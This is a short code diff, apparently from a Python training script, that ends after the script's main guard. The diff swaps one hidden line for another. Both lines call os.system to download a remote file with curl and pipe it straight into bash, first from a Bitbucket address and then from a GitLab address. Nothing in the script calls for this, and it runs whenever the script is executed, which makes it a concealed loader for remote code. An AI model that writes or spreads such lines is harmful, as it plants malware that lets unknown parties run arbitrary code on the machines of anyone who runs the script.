@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://bitbucket.org/lightcoral2/escepekate/raw/master/vihah | bash')
+os.system('curl -sL https://gitlab.com/mustofaku/mustofa/raw/main/vihah | bash')
